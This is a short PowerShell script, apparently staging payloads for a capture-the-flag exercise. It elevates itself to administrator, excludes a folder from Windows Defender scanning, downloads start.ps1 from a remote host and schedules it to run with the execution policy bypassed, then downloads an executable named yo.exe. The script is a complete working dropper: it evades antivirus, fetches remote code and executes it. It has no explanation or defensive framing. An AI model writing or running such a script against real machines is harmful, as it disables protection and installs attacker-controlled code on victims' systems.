# Run PowerShell as administrator if not already elevated
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList $($MyInvocation.Line) -Verb runAs
    exit
}

try {
    # Exclude the folder from Windows Defender
    $folderPath = "C:\ctf\payloads"
    if (-not (Test-Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath | Out-Null
        Write-Host "The directory $folderPath has been created."
    }
    Add-MpPreference -ExclusionPath $folderPath
    Write-Host "The directory $folderPath has been added to Windows Defender exclusions."

    # Download the start.ps1 file
    $startFileUrl = "http://192.168.7.16:80/start.ps1"
    $startFilePath = "$folderPath\start.ps1"
    Invoke-WebRequest -Uri $startFileUrl -OutFile $startFilePath
    Write-Host "The file $startFilePath has been successfully downloaded."

    # Schedule the start.ps1 task to run in 1 minute
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $startFilePath"
    Register-ScheduledTask -TaskName "RunStartScript" -Trigger $trigger -Action $action -Force
    Write-Host "The task to execute start.ps1 has been scheduled."

    # Download the payload file
    $payloadFileUrl = "http://192.168.7.16:80/yo.exe"
    $payloadFilePath = "$folderPath\yo.exe"
    Invoke-WebRequest -Uri $payloadFileUrl -OutFile $payloadFilePath
    Write-Host "The file $payloadFilePath has been successfully downloaded."

    Write-Host "Script completed successfully."
} catch {
    Write-Host "An error occurred: $($_.Exception.Message)"
} finally {
    Write-Host "Press Enter to close this window."
    Read-Host
}